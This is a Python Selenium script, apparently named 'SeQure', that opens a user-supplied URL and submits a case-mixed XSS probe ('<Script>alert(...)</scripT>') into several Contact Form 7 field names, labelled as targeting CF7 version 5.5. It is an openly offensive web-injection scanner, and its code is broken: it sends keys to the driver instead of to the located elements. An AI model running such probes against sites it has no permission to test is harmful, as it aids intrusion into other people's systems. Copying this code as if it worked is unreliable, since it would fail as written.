"""Tester to check the version and HTML elements."""
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time
import os

def setup(url):
    global driver
    options = Options()
    options.headless = True
    s = Service("C:/Program Files/chromedriver")
    driver = webdriver.Chrome(service=s, options=options)
    driver.implicitly_wait(10)
    driver.get(url)

def send_email():
    try: # these try blocks will get what version we are working with
        driver.find_elements(By.NAME,"your-subject") # your-subject
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"your-email") # your-email
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"email") # email
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"message") # message
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"subject") # subject
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"your-message") # your-message
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")
    try:
        driver.find_elements(By.NAME,"name") # name
        driver.send_keys("<Script>alert('Script entered.')</scripT>") # cf7 version 5.5
        time.sleep(10)
        button = driver.find_element(By.ID, "button")
        driver.execute_script("arguments[0].click();", button)
        #time.sleep(10)
    except:
        print("Element does not exist.")

if __name__ == "__main__":
    clear = lambda: os.system('cls')
    clear() # clear screen
    print("[+] Welcome to SeQure!\n") # starting prompt
    url = input("[+] Enter the URL you would like to check: ")
    print("---------------------------------------------------")
    setup(url)
    send_email()